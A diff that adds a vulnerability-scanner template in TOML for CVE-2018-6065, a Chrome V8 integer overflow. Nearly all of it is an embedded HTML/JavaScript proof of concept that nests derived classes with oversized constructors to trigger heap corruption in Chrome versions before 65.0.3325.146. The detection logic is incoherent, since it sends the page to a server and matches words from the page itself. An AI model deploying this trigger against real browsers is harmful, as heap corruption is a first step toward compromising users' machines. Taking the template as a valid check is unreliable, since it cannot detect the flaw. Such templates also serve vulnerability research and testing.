@@ -1,0 +1,73 @@
+[info]
+author = "ave"
+description = "Google Chrome V8 整数溢出漏洞 PoC，通过构造特制 JavaScript 对象触发整数溢出导致堆破坏，影响 Chrome < 65.0.3325.146"
+id = "POC-AVE-2018-0809"
+name = "CVE-2018-6065 PoC"
+severity = "high"
+tags = ["ave-2018-0809"]
+vuln_id = [
+    "CVE-2018-6065",
+    "AVE-2018-0809",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2018-6065 PoC</title>
+</head>
+<body>
+    <h1>CVE-2018-6065 PoC - Google Chrome V8 Integer Overflow</h1>
+    <p>如果浏览器崩溃或出现异常行为，说明漏洞存在。</p>
+    <script>
+        const f = eval(`(function f(i) {
+            if (i == 0) {
+                class Derived extends Object {
+                    constructor() {
+                        super();
+                        ${'this.a=1;'.repeat(0x3fffe-8)}
+                    }
+                }
+                return Derived;
+            }
+
+            class DerivedN extends f(i-1) {
+                constructor() {
+                    super();
+                    ${'this.a=1;'.repeat(0x40000-8)}
+                }
+            }
+            return DerivedN;
+        })`);
+
+        let a = new (f(0x7ff))();
+        console.log(a);
+    </script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "CVE-2018-6065",
+    "Integer Overflow",
+    "V8",
+]
